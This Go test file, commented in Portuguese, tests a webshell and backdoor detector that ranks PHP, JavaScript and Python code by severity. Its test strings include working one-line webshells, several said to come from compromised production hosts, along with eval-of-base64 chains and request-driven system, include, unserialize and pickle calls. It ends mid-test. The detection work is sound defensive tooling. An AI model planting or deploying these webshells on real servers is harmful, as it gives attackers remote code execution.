package facts

import (
	"github.com/lex0c/aletheia/internal/env"
	"os"
	"strings"
	"testing"
)

// tem responde se algum match casa o rótulo, no tier esperado.
func tem(ms []MatchDeCodigo, tier int, subRotulo string) bool {
	for _, m := range ms {
		if m.Tier == tier && strings.Contains(m.Regra, subRotulo) {
			return true
		}
	}
	return false
}

// O caso REAL que originou o check: um webshell de uma linha no bootstrap.php.
// A crase é o shell_exec do PHP, e ela envolve $_REQUEST — sink sobre entrada.
// Este é o padrão de maior sinal, e tem de sair como TIER 2.
func TestBootstrapPhpRealVaiParaTier2(t *testing.T) {
	linha := "if(isset($_REQUEST[0])){echo `$_REQUEST[0]`;die;}"
	ms := analisarConteudo(linha, "php")
	if !tem(ms, 2, "crase") {
		t.Fatalf("o webshell real do bootstrap.php tinha de sair TIER 2 por crase sobre entrada: %+v", ms)
	}
}

// Os outros clássicos de PHP, todos TIER 2 (quase sem falso positivo).
func TestClassicosPhpTier2(t *testing.T) {
	// Todos são webshell clássico e têm de sair TIER 2. Qual rótulo casa
	// primeiro não importa — uma linha pode ter várias propriedades críticas
	// (sink E eval-de-decode); o motor reporta a de maior tier, uma por linha.
	criticos := []string{
		`eval($_POST['x']);`,
		`system($_GET['cmd']);`,
		`@eval(base64_decode($_POST[z]));`,
		`eval(gzinflate(base64_decode($x)));`,
		`preg_replace("/.*/e", $_GET['c'], $s);`,
		`call_user_func($_REQUEST['f'], $_GET);`,
	}
	for _, linha := range criticos {
		if ms := analisarConteudo(linha, "php"); !tem(ms, 2, "") {
			t.Errorf("%q: esperava TIER 2, veio %+v", linha, ms)
		}
	}
}

// preg_replace com /e, sem entrada de request explícita, ainda é TIER 2: o
// modificador executa o replacement, e é RCE clássico.
func TestPregReplaceModificadorE(t *testing.T) {
	ms := analisarConteudo(`$out = preg_replace('/(.*)/e', 'system("\\1")', $data);`, "php")
	if !tem(ms, 2, "preg_replace") && !tem(ms, 2, "sink") {
		t.Errorf("preg_replace /e tinha de ser TIER 2: %+v", ms)
	}
}

// A FRONTEIRA que separa peneira útil de ruído: `eval` puro, SEM entrada de
// request, é TIER 1 (leia), não TIER 2 (backdoor). Framework e template usam
// eval legitimamente, e chamar isso de crítico gastaria a confiança no check.
func TestEvalPuroEhTier1NaoTier2(t *testing.T) {
	ms := analisarConteudo(`$result = eval('return 1 + 1;');`, "php")
	if tem(ms, 2, "") {
		t.Errorf("eval sem entrada de request NÃO pode ser crítico: %+v", ms)
	}
	if !tem(ms, 1, "eval") {
		t.Errorf("mas continua sendo TIER 1, para leitura: %+v", ms)
	}
}

// Comentário não dispara: casar dentro de `// exemplo: eval($_GET)` encheria de
// falso positivo doc e código de exemplo.
func TestComentarioNaoDispara(t *testing.T) {
	for _, trecho := range []string{
		"// perigo: eval($_POST['x'])",
		"# system($_GET['cmd'])",
		"/* nota: assert($_REQUEST['y']) */",
		"/**\n * exemplo: system($_GET['cmd'])\n * não roda\n */\n$x = 1;",
	} {
		if ms := analisarConteudo(trecho, "php"); len(ms) != 0 {
			t.Errorf("comentário não pode disparar: %q -> %+v", trecho, ms)
		}
	}
}

// Node e Python: o mesmo formato de co-ocorrência.
func TestNodeEPython(t *testing.T) {
	// Rótulo unificado agora ("sink de execução sobre entrada de request"): o
	// que importa é o TIER, não a etiqueta exata do sink.
	for _, c := range []struct{ lang, src string }{
		{"js", `const r = require('child_process').execSync(req.query.cmd);`},
		{"js", `eval(req.body.payload)`},
		{"python", `os.system(request.args['c'])`},
		{"python", `data = pickle.loads(request.data)`},
	} {
		if ms := analisarConteudo(c.src, c.lang); !tem(ms, 2, "") {
			t.Errorf("%s: %q tinha de ser TIER 2: %+v", c.lang, c.src, ms)
		}
	}
}

// Código limpo não gera nada. Um check que acusa arquivo comum é ruído
// permanente, e a extensão desconhecida nem é analisada.
func TestCodigoLimpoEExtensaoDesconhecida(t *testing.T) {
	limpo := "<?php\nclass Foo {\n  public function bar() { return $this->x; }\n}\n"
	if ms := analisarConteudo(limpo, "php"); len(ms) != 0 {
		t.Errorf("código limpo não pode gerar match: %+v", ms)
	}
	if linguagemPorExtensao("/var/www/logo.png") != "" {
		t.Error(".png não é código para analisar")
	}
	if linguagemPorExtensao("/data/local/www/app/bootstrap.php") != "php" {
		t.Error(".php tinha de ser reconhecido")
	}
}

// Regressão do starvation entre raízes: uma raiz ENORME (muitos arquivos em
// /var/www) não pode consumir o orçamento e deixar a raiz seguinte (/data, onde
// mora a aplicação) sem varrer. Foi o que aconteceu num host real: o webshell
// de /var/www foi achado e o de /data/.../app/bootstrap.php passou.
//
// O teste baixa o teto por raiz, enche /var/www além dele e planta o backdoor
// em /data. Com orçamento POR RAIZ, /data é alcançado.
func TestVarreduraDeCodigoNaoDeixaRaizPosteriorPassarFome(t *testing.T) {
	salvoA, salvoD := maxCodigoArquivos, maxCodigoDirs
	maxCodigoArquivos, maxCodigoDirs = 4, 20000
	defer func() { maxCodigoArquivos, maxCodigoDirs = salvoA, salvoD }()

	raiz := t.TempDir()
	must := func(p, conteudo string) {
		t.Helper()
		if err := os.MkdirAll(filepathDir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(conteudo), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// /var/www com mais arquivos que o teto por raiz: esgota o orçamento DELE.
	for i := 0; i < 12; i++ {
		must(raiz+"/var/www/site/generated/f"+itoa(i)+".php", "<?php // comum\n")
	}
	// o backdoor mora numa raiz POSTERIOR (/data).
	must(raiz+"/data/local/www/consultoria/app/bootstrap.php",
		"<?php\nif(isset($_REQUEST[0])){echo `$_REQUEST[0]`;die;}\n")

	e := env.Probe(env.Options{Root: raiz, Version: "test"})
	defer e.Close()
	f := &Facts{}
	collectCodigo(f, e)

	var achou bool
	for _, cs := range f.CodigoSuspeito {
		if hasSuffix(cs.Path, "app/bootstrap.php") {
			achou = true
		}
	}
	if !achou {
		t.Fatalf("com orçamento por raiz, /data tinha de ser alcançado mesmo com "+
			"/var/www esgotando o teto — achados: %+v", f.CodigoSuspeito)
	}
}

func filepathDir(p string) string {
	if i := strings.LastIndexByte(p, '/'); i >= 0 {
		return p[:i]
	}
	return "."
}
func hasSuffix(s, suf string) bool { return strings.HasSuffix(s, suf) }

// Bug D: a forma MAIS comum do subprocess tem a entrada antes do shell=True.
// Exigir shell=True primeiro deixava o caso típico só em tier 1.
func TestSubprocessEntradaAntesDeShellTrue(t *testing.T) {
	casos := []string{
		`subprocess.run(request.args["cmd"], shell=True)`,
		`subprocess.Popen(request.form["x"], shell=True)`,
		`subprocess.call(shell=True, args=request.args["c"])`, // a outra ordem também
	}
	for _, linha := range casos {
		if ms := analisarConteudo(linha, "python"); !tem(ms, 2, "") {
			t.Errorf("%q: subprocess+shell=True sobre request é TIER 2 nas duas ordens: %+v", linha, ms)
		}
	}
}

// Bug C: diretório ou arquivo de código ILEGÍVEL não pode sumir do universo
// avaliado em silêncio — é a regra central do projeto. ReadDirNames engolia o
// erro e devolvia lista vazia; agora um diretório sem permissão vira lacuna
// DECLARADA, e não-existe (raiz que o host não tem) continua sem ruído.
func TestCodigoIlegivelViraLacunaNaoSilencio(t *testing.T) {
	raiz := t.TempDir()
	seg := raiz + "/var/www/segredo"
	if err := os.MkdirAll(seg, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(seg+"/x.php", []byte("<?php system($_GET[0]);"), 0o644); err != nil {
		t.Fatal(err)
	}
	// tira a permissão de LISTAR o diretório (só funciona como não-root).
	if err := os.Chmod(seg, 0o000); err != nil {
		t.Fatal(err)
	}
	defer os.Chmod(seg, 0o755) // para o t.TempDir conseguir limpar

	if os.Geteuid() == 0 {
		t.Skip("como root tudo é legível — este teste só vale sem privilégio")
	}

	e := env.Probe(env.Options{Root: raiz, Version: "test"})
	defer e.Close()
	f := &Facts{}
	collectCodigo(f, e)

	msgs := ""
	for _, m := range f.PersistDenied["codigo"] {
		msgs += m + " | "
	}
	if !strings.Contains(msgs, "não puderam ser LISTADOS") {
		t.Errorf("diretório ilegível tinha de virar lacuna declarada, veio: %q", msgs)
	}
}

// Os saltos da review: multiline, micro-taint, remote vs local, frameworks.
func TestMultilineEMicroTaint(t *testing.T) {
	tier2 := map[string]string{
		// multiline: o sink e a entrada em linhas diferentes, um statement só
		"php-multiline": "<?php\nsystem(\n  $_GET['cmd']\n);",
		// micro-taint de duas linhas, nas três linguagens
		"php-taint": "<?php\n$cmd = $_GET['cmd'];\nsystem($cmd);",
		"js-taint":  "const cmd = req.query.cmd;\nexec(cmd);",
		"py-taint":  "cmd = request.args['cmd']\nos.system(cmd)",
		// frameworks
		"django":  "cmd = request.POST['c']\nos.system(cmd)",
		"koa":     "const c = ctx.query.cmd;\nexecSync(c);",
		"laravel": "<?php $c = $request->input('cmd'); system($c);",
		// include/require e unserialize sobre request
		"php-lfi":         "<?php include($_GET['page']);",
		"php-unserialize": "<?php unserialize($_POST['o']);",
		// subprocess na ordem comum
		"py-subprocess": `subprocess.run(request.args["cmd"], shell=True)`,
	}
	for nome, src := range tier2 {
		lang := "php"
		if strings.HasPrefix(nome, "js") || nome == "koa" {
			lang = "js"
		} else if strings.HasPrefix(nome, "py") || nome == "django" {
			lang = "python"
		}
		if ms := analisarConteudo(src, lang); !tem(ms, 2, "") {
			t.Errorf("%s: esperava TIER 2, veio %+v\n(src: %q)", nome, ms, src)
		}
	}
}

// Remote ≠ local: entrada de argv/env/stdin com sink é AVISO (tier 1), não
// crítico. exec(process.env.X) é código ruim, não "atacante remoto controla".
func TestEntradaLocalNaoEhCritica(t *testing.T) {
	locais := map[string]string{
		"js-env":       `exec(process.env.BACKUP_COMMAND)`,
		"py-argv":      `subprocess.run(sys.argv[1], shell=True)`,
		"py-argv-sink": `os.system(sys.argv[1])`,
		"php-getenv":   `<?php system(getenv('CMD'));`,
	}
	for nome, src := range locais {
		lang := "php"
		if strings.HasPrefix(nome, "js") {
			lang = "js"
		} else if strings.HasPrefix(nome, "py") {
			lang = "python"
		}
		ms := analisarConteudo(src, lang)
		if tem(ms, 2, "") {
			t.Errorf("%s: entrada LOCAL não pode ser crítica: %+v", nome, ms)
		}
		if !tem(ms, 1, "") {
			t.Errorf("%s: mas continua sendo tier 1 (leia): %+v", nome, ms)
		}
	}
}

// Falsos positivos MEDIDOS num host real (Climatempo): o check gritava no
// PHPMailer e no Adminer, afogando dois webshells de verdade. Cada um violava a
// co-ocorrência de um jeito diferente, e cada correção está travada aqui.
func TestFalsosPositivosDeHostReal(t *testing.T) {
	// NÃO podem ser tier 2:
	naoCrit := map[string]string{
		// PHPMailer: /e com replacement FIXO (quoted-printable), sem request.
		"phpmailer preg /e": `$encoded = preg_replace("/([^A-Za-z0-9!*+\/ -])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);`,
		// callback FIXO com request só como dado: trim não executa o $_POST.
		"call_user_func fixo": `call_user_func('trim', $_POST['x']);`,
		"array_map fixo":      `array_map('idf_escape', $w["columns"]); if($_GET["x"]){}`,
		// crase dentro de blob binário (lzw_decompress): controle barra o span.
		"crase em binário": "lzw_decompress(\"\x00\x00\x00`\x01\x16\x06$_GET\x04\");",
	}
	for nome, src := range naoCrit {
		if ms := analisarConteudo(src, "php"); tem(ms, 2, "") {
			t.Errorf("FALSO POSITIVO: %q virou tier 2: %+v", nome, ms)
		}
	}
	// e o /e FIXO ainda sai como tier 1 (vale ler, não alarma):
	if ms := analisarConteudo(`preg_replace("/x/e", "sprintf('%02X', ord('\\1'))", $s);`, "php"); !tem(ms, 1, "/e") {
		t.Errorf("preg_replace /e sem input continua sendo observação (tier 1): %+v", ms)
	}

	// DEVEM continuar tier 2 (o callback e o /e COM request são RCE de verdade):
	crit := map[string]string{
		"callback pelo request": `call_user_func($_GET['f'], $_GET['a']);`,
		"preg /e com request":   `preg_replace('/(.*)/e', $_GET['r'], $s);`,
		"webshell eval":         `<?php eval($_GET[0]);`,
	}
	for nome, src := range crit {
		if ms := analisarConteudo(src, "php"); !tem(ms, 2, "") {
			t.Errorf("VERDADEIRO POSITIVO perdido: %q deixou de ser tier 2: %+v", nome, ms)
		}
	}
}

// Os itens da terceira review: bypass por string, taint ordenado, boundary de
// parênteses, cobertura de sinks no taint, e Python multilinha. Cada linha é um
// falso negativo ou falso positivo que a versão anterior tinha.
func TestReviewTerceiraRodada(t *testing.T) {
	type c struct {
		lang, src string
		tier2     bool
	}
	casos := map[string]c{
		// item 1: // dentro de string não podia apagar o webshell seguinte
		"bypass por string":   {"php", "<?php\n$x=\"http://foo\"; system($_GET['cmd']);", true},
		"bypass /* em string": {"js", "const x=\"/*\";\neval(req.body.cmd)", true},
		// item 2: ordem e reatribuição
		"sink antes do source": {"php", "system($cmd);\n$cmd=$_GET['x'];", false},
		"reatribuído a seguro": {"php", "$cmd=$_GET['x'];\n$cmd='date';\nsystem($cmd);", false},
		// item 3: JS sem ; não pode juntar dois statements
		"js sem ponto-vírgula": {"js", "exec(\"uptime\")\nconst cmd=req.query.cmd", false},
		// item 4: taint cobre subprocess/include/unserialize/new Function
		"taint subprocess":   {"python", "cmd=request.args['cmd']\nsubprocess.run(cmd, shell=True)", true},
		"taint include":      {"php", "$p=$_GET['page'];\ninclude($p);", true},
		"taint unserialize":  {"php", "$x=$_POST['o'];\nunserialize($x);", true},
		"taint new Function": {"js", "const c=req.body.code;\nnew Function(c)", true},
		// item 5: Python multilinha
		"python multilinha": {"python", "subprocess.run(\n  request.args['cmd'],\n  shell=True,\n)", true},
	}
	for nome, k := range casos {
		if tem(analisarConteudo(k.src, k.lang), 2, "") != k.tier2 {
			t.Errorf("%s: esperava tier2=%v -> %+v", nome, k.tier2, analisarConteudo(k.src, k.lang))
		}
	}
}

// FPs de host real que NÃO são backdoor — vulnerabilidade ou anti-padrão, mas
// não implante. Cada um distingue uma coisa que o motor precisa saber separar.
func TestNaoBackdoorDeHostReal(t *testing.T) {
	naoCrit := map[string]string{
		// jpGraph: `new $theme()` com $theme do request é object injection
		// (vulnerabilidade), e é código de EXEMPLO de biblioteca. Instanciação,
		// não chamada de função.
		"jpgraph new-classe": "$theme=$_GET['theme'];\nif($theme){ $g->SetTheme(new $theme()); }",
		// dispatch dinâmico de MÉTODO num objeto: $obj->$metodo() só alcança os
		// métodos daquele objeto — anti-padrão de MVC legado, não RCE. O `->`
		// separa do `$fn()` livre.
		"dispatch metodo":   "$metodo=$_GET['metodo'];\n$dados=$obj->$metodo($filtro,$qtd);",
		"dispatch estatico": "$m=$_GET['m'];\nFoo::$m($x);",
	}
	for nome, src := range naoCrit {
		if ms := analisarConteudo(src, "php"); tem(ms, 2, "") {
			t.Errorf("%s: NÃO é backdoor (vuln/anti-padrão, não RCE): %+v", nome, ms)
		}
	}
	// Mas a chamada de FUNÇÃO nomeada pelo request continua RCE:
	for _, src := range []string{
		`$fn=$_GET['f'];` + "\n" + `$fn($_GET['a']);`,
		`$_GET['a']($_GET['b']);`,
	} {
		if ms := analisarConteudo(src, "php"); !tem(ms, 2, "") {
			t.Errorf("função dinâmica pelo request É RCE: %q -> %+v", src, ms)
		}
	}
}

// A QUARTA rodada de falsos positivos, e esta veio medida de um host de
// produção de verdade: oito críticos, três webshells e cinco enganos. Cada
// teste daqui trava um dos cinco, e o motivo de nenhum deles ser "multilinha"
// está escrito em cada um — a peneira não errava por olhar mais de uma linha,
// errava por não entender a ESTRUTURA que a linha está dentro.

// FP 1 — guard de allowlist. O dispatcher legado do reportico/adodb
// (tests/tmssql.php) saía CRÍTICO: o motor via `$_GET -> $do -> $do()` e parava
// aí. Só que `?do=system` não casa nenhum `case`, e o sink não roda.
func TestGuardDeAllowlistNaoEhExecucaoArbitraria(t *testing.T) {
	// O arquivo real, reduzido ao que importa:
	tmssql := "<?php\n$do = $_GET['do'];\nswitch($do) {\ncase 'tpear':\ncase 'tadodb':\ncase 'tmssql':\n    $do();\n}\n"
	naoCrit := map[string]string{
		"switch de literais": tmssql,
		"in_array literal":   "<?php\n$fn=$_GET['fn'];\nif (in_array($fn, ['foo','bar'], true)) { $fn(); }\n",
		"in_array em var":    "<?php\n$ok=['foo','bar'];\n$fn=$_GET['fn'];\nif (in_array($fn,$ok,true)) $fn();\n",
		"switch com sink":    "<?php\n$c=$_GET['c'];\nswitch($c){case 'ls': case 'df': system($c);}\n",
	}
	for nome, src := range naoCrit {
		if ms := analisarConteudo(src, "php"); tem(ms, 2, "") {
			t.Errorf("%s: allowlist literal antes do sink NÃO é execução arbitrária: %+v", nome, ms)
		}
	}
	// Mas some do relatório? Não: continua sendo tier 1, para quem audita a
	// fundo — a lista pode crescer, ou conter o que não devia.
	if ms := analisarConteudo(tmssql, "php"); !tem(ms, 1, "allowlist") {
		t.Errorf("o dispatch restrito continua merecendo leitura (tier 1): %+v", ms)
	}

	// E o guard tem de ser guard MESMO. Cada um destes deixa passar valor
	// arbitrário, e continua CRÍTICO:
	crit := map[string]string{
		// `default` recebe qualquer coisa, inclusive ?do=system
		"switch com default": "<?php\n$do=$_GET['do'];\nswitch($do){case 'a': default: $do();}\n",
		// rótulo que não é literal: o que ele vale não está escrito ali
		"case não-literal": "<?php\n$do=$_GET['do'];\nswitch($do){case $x: $do();}\n",
		// o sink está DEPOIS do switch: o corpo acabou, a restrição também
		"sink fora do bloco": "<?php\n$do=$_GET['do'];\nswitch($do){case 'a': echo 1;}\n$do();\n",
		// a lista não é fechada: quem a monta decide o que entra
		"in_array dinâmico": "<?php\n$ok=explode(',',$cfg);\n$fn=$_GET['fn'];\nif(in_array($fn,$ok)) $fn();\n",
		// negado: o `!` protege o que vem DEPOIS, não o corpo
		"in_array negado":   "<?php\n$fn=$_GET['fn'];\nif(!in_array($fn,['a','b'])) { $fn(); }\n",
		"in_array == false": "<?php\n$fn=$_GET['fn'];\nif(in_array($fn,['a','b'])==false) { $fn(); }\n",
		// sem guard nenhum, que é o webshell
		"sem guard": "<?php\n$do=$_GET['do'];\n$do();\n",
	}
	for nome, src := range crit {
		if ms := analisarConteudo(src, "php"); !tem(ms, 2, "") {
			t.Errorf("%s: isto NÃO é allowlist, continua sendo RCE: %+v", nome, ms)
		}
	}
}

// FP 2 — o taint atravessava função. `$p = $_GET['page']` numa e `include($p)`
// em outra são duas variáveis com o mesmo nome, não um fluxo; num arquivo
// legado de mil linhas isso rende crítico atrás de crítico.
func TestTaintNaoAtravessaFuncao(t *testing.T) {
	naoCrit := map[string]string{
		"homônimas em funções diferentes": "<?php\nfunction a(){ $p=$_GET['page']; echo $p; }\nfunction b(){ include($p); }\n",
		"contaminada dentro, usada fora":  "<?php\nfunction a(){ $c=$_POST['c']; }\nsystem($c);\n",
	}
	for nome, src := range naoCrit {
		if ms := analisarConteudo(src, "php"); tem(ms, 2, "") {
			t.Errorf("%s: coincidência de nome não é fluxo: %+v", nome, ms)
		}
	}
	// O que a função IMPORTA de fora é fluxo de verdade, e continua crítico:
	crit := map[string]string{
		"mesma função":    "<?php\nfunction r(){ $c=$_POST['c']; system($c); }\n",
		"global":          "<?php\n$c=$_POST['c'];\nfunction r(){ global $c; system($c); }\n",
		"closure com use": "<?php\n$c=$_POST['c'];\n$f=function() use ($c){ system($c); };\n",
		"topo do arquivo": "<?php\nfunction ajuda(){ return 1; }\n$c=$_POST['c'];\nsystem($c);\n",
	}
	for nome, src := range crit {
		if ms := analisarConteudo(src, "php"); !tem(ms, 2, "") {
			t.Errorf("%s: isto É fluxo, tinha de continuar crítico: %+v", nome, ms)
		}
	}
}

// FP 3 — o span de `include` atravessava o fim do statement. Este é o único FP
// da leva que tem a ver com multilinha, e a correção NÃO foi voltar para uma
// linha: foi impedir o span de pular para a linha de baixo. `<?php include(...)
// ?>` seguido de `$_SERVER['PHP_SELF']` num <form> é PHP legado comum, e saía
// CRÍTICO porque entre os dois não há `;`.
func TestIncludeNaoAtravessaOFimDoStatement(t *testing.T) {
	naoCrit := map[string]string{
		"include e form": "<?php include('menu.php') ?>\n<form action=\"<?php echo $_SERVER['PHP_SELF']; ?>\">\n",
		"require e link": "<?php require_once('head.php') ?>\n<a href=\"?p=<?php echo $_GET['p'] ?>\">x</a>\n",
	}
	for nome, src := range naoCrit {
		if ms := analisarConteudo(src, "php"); tem(ms, 2, "") {
			t.Errorf("%s: o statement acabou antes do $_GET: %+v", nome, ms)
		}
	}
	// A LFI de verdade continua crítica, inclusive na forma multilinha — que é
	// coberta pelo argumento balanceado, não pelo span.
	crit := map[string]string{
		"lfi direta":        "<?php include($_GET['page']);",
		"lfi sem parêntese": "<?php include $_GET['page'];",
		"lfi multilinha":    "<?php include(\n  $_GET['page']\n);",
		"lfi concatenada":   "<?php include(dirname(__FILE__).'/'.$_GET['page']);",
	}
	for nome, src := range crit {
		if ms := analisarConteudo(src, "php"); !tem(ms, 2, "") {
			t.Errorf("%s: LFI continua sendo crítica: %+v", nome, ms)
		}
	}
}

// FP 4 — crase dentro de string. A crase do PHP é shell_exec, mas só em posição
// de CÓDIGO: dentro de "..." ela é aspa de identificador do MySQL. Medido no
// Adminer: metade dos críticos do arquivo era isso.
func TestCraseSoEmPosicaoDeCodigo(t *testing.T) {
	naoCrit := map[string]string{
		"identificador mysql": "<?php\n$s = str_replace(\"`\",\"``\",$_GET[\"col\"]);\n",
		"crase em regex":      "<?php\n$r = preg_match('~^(`(?:[^`]|``)+`)~', $_GET[\"order\"]);\n",
		"crase em blob":       "lzw_decompress(\"\x00\x00\x00`\x01\x16\x06$_GET\x04\");",
	}
	for nome, src := range naoCrit {
		if ms := analisarConteudo(src, "php"); tem(ms, 2, "") {
			t.Errorf("%s: crase dentro de string não é shell_exec: %+v", nome, ms)
		}
	}
	// Os webshells de crase REAIS deste host (dois arquivos, duas formas):
	// continuam saindo, inclusive a crase com interpolação `{$_REQUEST[1]}`.
	reais := []string{
		"<?php if(isset($_REQUEST[0])){echo `$_REQUEST[0]`;die;}", // bootstrap.php
		"<?php ob_clean(); echo `{$_REQUEST[1]}`; die;?>",         // generated/valecarajas/index.php
	}
	for _, src := range reais {
		if ms := analisarConteudo(src, "php"); !tem(ms, 2, "crase") {
			t.Errorf("crase em posição de código é o sinal mais forte, tinha de sair: %q -> %+v", src, ms)
		}
	}
}

// FP 5 — o callback nem sempre é o primeiro argumento. `array_map(cb, arr)` tem
// a função na frente; `array_filter(arr, cb)`, atrás. Lendo os dois como "1º
// argumento", o motor tomava o ARRAY por função chamada — e um `array_filter(
// $_POST["source"], 'strlen')` do Adminer virava RCE.
func TestCallbackEhOArgumentoQueExecuta(t *testing.T) {
	naoCrit := map[string]string{
		"array_filter com dado do request": `<?php array_filter($_POST["source"], 'strlen');`,
		"usort com dado do request":        `<?php usort($_GET["rows"], 'cmp');`,
		"array_walk com dado do request":   `<?php array_walk($_POST["x"], 'trim');`,
		"array_map com callback fixo":      `<?php array_map('idf_escape', $_GET["columns"]);`,
	}
	for nome, src := range naoCrit {
		if ms := analisarConteudo(src, "php"); tem(ms, 2, "") {
			t.Errorf("%s: o request é o DADO, não a função executada: %+v", nome, ms)
		}
	}
	crit := map[string]string{
		"array_filter com callback do request": `<?php array_filter($rows, $_GET['f']);`,
		"array_map com callback do request":    `<?php array_map($_GET['f'], $rows);`,
		"call_user_func do request":            `<?php call_user_func($_GET['f'], $a);`,
	}
	for nome, src := range crit {
		if ms := analisarConteudo(src, "php"); !tem(ms, 2, "") {
			t.Errorf("%s: callback escolhido pelo request É RCE: %+v", nome, ms)
		}
	}
}

// Comparar não contamina. `$x == $_GET['a']` casava o mesmo `var = rhs` da
// atribuição, e marcava $x — o mesmo valia para `$k => $_GET['v']` de um array.
func TestComparacaoNaoEhAtribuicao(t *testing.T) {
	naoCrit := map[string]string{
		"igualdade":     "<?php\nif ($acao == $_GET['acao']) { system($acao); }\n",
		"idêntico":      "<?php\nif ($acao === $_GET['acao']) { system($acao); }\n",
		"seta de array": "<?php\n$m = [$k => $_GET['v']];\nsystem($k);\n",
	}
	for nome, src := range naoCrit {
		if ms := analisarConteudo(src, "php"); tem(ms, 2, "") {
			t.Errorf("%s: comparação não contamina: %+v", nome, ms)
		}
	}
}

// O mascarador tem de saber ONDE o código começa. Num .php o arquivo é saída
// até o primeiro `<?`, e tratar HTML como código dessincronizava a máquina de
// estados no primeiro apóstrofo: `<p>it's here</p>` abria uma string que
// engolia o código de baixo. Isso derrubava justamente a crase — o padrão de
// MAIOR sinal do check —, porque só ela depende do estado para distinguir
// shell_exec de aspa de identificador. Heredoc tinha o mesmo efeito.
func TestMascaradorNaoSeDessincroniza(t *testing.T) {
	webshell := map[string]string{
		"html com apóstrofo antes": "<html><p>it's here</p>\n<?php echo `$_REQUEST[0]`; ?>\n",
		"heredoc antes":            "<?php\n$t = <<<EOT\n  don't stop\nEOT;\necho `$_REQUEST[0]`;\n",
		"nowdoc antes":             "<?php\n$t = <<<'EOT'\n  don't stop\nEOT;\necho `$_REQUEST[0]`;\n",
		"sem html":                 "<?php echo `$_REQUEST[0]`;\n",
		"depois de fechar a tag":   "<?php $a=1; ?>\n<p>don't</p>\n<?php echo `$_GET[0]`; ?>\n",
	}
	for nome, src := range webshell {
		if ms := analisarConteudo(src, "php"); !tem(ms, 2, "crase") {
			t.Errorf("%s: o webshell de crase não pode sumir por causa do que vem ANTES: %+v", nome, ms)
		}
	}
	// E o que está FORA da tag é saída, não código: não se analisa.
	if ms := analisarConteudo("<html>\n<p>use eval($_GET[0]) com cuidado</p>\n<?php $a=1; ?>\n", "php"); len(ms) != 0 {
		t.Errorf("texto de HTML não é código: %+v", ms)
	}
	// Fragmento sem tag nenhuma continua sendo analisado inteiro — é assim que
	// o resto desta suíte escreve os casos, e um .inc de código puro existe.
	if ms := analisarConteudo("system($_GET['cmd']);", "php"); !tem(ms, 2, "") {
		t.Errorf("fragmento sem tag continua sendo código: %+v", ms)
	}
}

// O VERDADEIRO POSITIVO que a leva de FPs por pouco não escondeu: o
// cadastro_ena/index.php de um host real. É `eval` de aritmética sobre `$_GET`
// — a variável recebe o request cru e entra num `eval` de string, e o
// number_format que a limparia só roda na linha SEGUINTE (tarde: a 1ª volta do
// loop já executou o eval com o valor cru). É RCE pós-autenticação, e é
// exatamente a co-ocorrência sink+entrada que o check existe para pegar.
//
// Este teste é uma trava: NENHUMA supressão futura (allowlist, escopo, string,
// callback) pode rebaixar isto, porque nenhuma barreira está entre o $_GET e o
// eval. Se um dia alguém alargar um guard e este caso cair para tier 1, o teste
// quebra e a conversa acontece antes do release, não no host.
func TestEnaEvalAritmeticaSobreGetContinuaCritico(t *testing.T) {
	// A linha real, com o fluxo em volta (atribuição crua, eval, sanitização
	// só DEPOIS):
	real := `<?php
$mlt_percent_calc = $_GET["mlt_percent"];
foreach($dados as $item){
    eval("\$mlt_percent_calc =".$mlt_percent_calc.($mlt_percent>=0?"+".$mlt_percent:$mlt_percent).";");
    $mlt_percent_calc = number_format($mlt_percent_calc,0,"","");
}
`
	if ms := analisarConteudo(real, "php"); !tem(ms, 2, "") {
		t.Fatalf("eval de string concatenando $_GET cru É RCE, tinha de ser TIER 2: %+v", ms)
	}

	// A ORDEM importa, e é ela que torna o caso real vulnerável: a limpeza vem
	// DEPOIS do eval. Se viesse ANTES, o valor no eval já estaria são, e o
	// motor NÃO pode acusar — é a mesma regra do "reatribuído a seguro".
	saneado := `<?php
$x = $_GET["p"];
$x = number_format($x,0,"","");
eval("\$y =".$x.";");
`
	if ms := analisarConteudo(saneado, "php"); tem(ms, 2, "") {
		t.Errorf("sanitizado ANTES do eval não é crítico (taint limpo): %+v", ms)
	}

	// E o eval de aritmética de duas linhas — a forma mínima do bug — também:
	minimo := "<?php\n$c=$_GET['n'];\neval(\"\\$r = \".$c.\";\");"
	if ms := analisarConteudo(minimo, "php"); !tem(ms, 2, "") {
		t.Errorf("a forma mínima (get cru -> eval) continua crítica: %+v", ms)
	}
}

// A varredura é BFS por nível, e isto trava o motivo. O caso real: um webshell
// em /data/local/www/data/consultoria/app/bootstrap.php passou porque uma
// árvore de DADOS irmã (arquivo de imagens de anos) consumiu o teto por raiz
// ANTES de a recursão em profundidade chegar na aplicação. Código servido é
// raso; dado é fundo. A fila por nível gasta o orçamento no raso primeiro.
//
// A garantia é determinística: TODOS os diretórios de um nível têm os arquivos
// diretos analisados antes de QUALQUER diretório do nível seguinte. Então um
// webshell num diretório raso é achado antes de a árvore funda sequer ser
// descida — não importa a ordem que o readdir devolveu os irmãos.
func TestVarreduraBFSAchaCodigoRasoAntesDeArvoreFundaIrma(t *testing.T) {
	salvoA, salvoD := maxCodigoArquivos, maxCodigoDirs
	// Orçamento de arquivos minúsculo: só cabe o raso. Se a árvore funda for
	// visitada primeiro (DFS), ela esgota isto e o webshell passa.
	maxCodigoArquivos, maxCodigoDirs = 3, 20000
	defer func() { maxCodigoArquivos, maxCodigoDirs = salvoA, salvoD }()

	raiz := t.TempDir()
	must := func(p, conteudo string) {
		t.Helper()
		if err := os.MkdirAll(filepathDir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(conteudo), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// o webshell: arquivo DIRETO de um diretório de aplicação, raso (nível 2
	// sob a raiz /data). É a forma do bootstrap.php real.
	must(raiz+"/data/consultoria/app/bootstrap.php",
		"<?php\nif(isset($_REQUEST[0])){echo `$_REQUEST[0]`;die;}\n")
	// a árvore de dados IRMÃ: muitos .php, todos FUNDOS (nível 4+). Sob DFS que
	// mergulhe aqui primeiro, os 3 arquivos de orçamento morrem aqui.
	for i := 0; i < 40; i++ {
		must(raiz+"/data/arquivo/2019/"+itoa(i)+"/idx.php", "<?php system($_GET['x']);\n")
	}

	e := env.Probe(env.Options{Root: raiz, Version: "test"})
	defer e.Close()
	f := &Facts{}
	collectCodigo(f, e)

	var achou bool
